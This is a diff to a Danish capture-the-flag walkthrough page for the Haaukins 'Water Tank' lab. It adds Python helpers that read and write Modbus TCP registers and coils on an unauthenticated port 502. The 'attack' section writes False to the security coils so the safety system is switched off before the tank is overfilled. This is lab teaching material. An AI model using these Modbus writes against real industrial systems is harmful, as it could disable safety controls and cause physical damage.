@@ -3,11 +3,11 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Haaukins: Water Tank (tutorial: Modbus TCP uden auth, forbi en read-only web-dashboard)</title>
+<title>Haaukins: Water Tank (tutorial: Modbus TCP uden auth, forbi et read-only web-dashboard)</title>
 <meta name="description" content="Guide til Haaukins Water Tank: et pænt web-dashboard er kun en read-only afspejling; den rigtige kontrolkanal er Modbus TCP på port 502 uden nogen autentificering.">
 <link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/water-tank.html">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Haaukins: Water Tank (tutorial: Modbus TCP uden auth, forbi en read-only web-dashboard)">
+<meta property="og:title" content="Haaukins: Water Tank (tutorial: Modbus TCP uden auth, forbi et read-only web-dashboard)">
 <meta property="og:description" content="Guide til Haaukins Water Tank: et pænt web-dashboard er kun en read-only afspejling; den rigtige kontrolkanal er Modbus TCP på port 502 uden nogen autentificering.">
 <meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/water-tank.html">
 <meta property="og:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
@@ -52,14 +52,16 @@ def send_recv(pdu, host, unit=1):
     s.close()
     return resp
 
-# læs holding register (function code 0x03)
-send_recv(struct.pack("&gt;BHH", 0x03, addr, count), host)
-# skriv ét holding register (function code 0x06)
-send_recv(struct.pack("&gt;BHH", 0x06, addr, value), host)
-# skriv én coil (function code 0x05), 0xFF00=true, 0x0000=false
-send_recv(struct.pack("&gt;BHH", 0x05, addr, 0xFF00 if val else 0x0000), host)</code></pre>
+# navngivne hjælpere oven på send_recv:
+def read_reg(addr, count=1):   # function code 0x03
+    return send_recv(struct.pack("&gt;BHH", 0x03, addr, count), host)
+def write_reg(addr, value):    # function code 0x06
+    return send_recv(struct.pack("&gt;BHH", 0x06, addr, value), host)
+def write_coil(addr, val):     # function code 0x05, 0xFF00=true, 0x0000=false
+    return send_recv(struct.pack("&gt;BHH", 0x05, addr, 0xFF00 if val else 0x0000), host)</code></pre>
              <p>Holding register 1 = temperatur, register 2 = water_level, matcher nøjagtigt
-             web-dashboardets viste værdier. Coil 0/1 hænger sammen med security-systemet.</p>
+             web-dashboardets viste værdier (en læsning af reg 1/2 giver præcis de tal dashboardet
+             viser). Coil 0/1 hænger sammen med security-systemet.</p>
 <h2>Angrebet: sluk security, sæt water_level over kapacitet</h2>
 <pre><code>write_coil(0, False)
 write_coil(1, False)
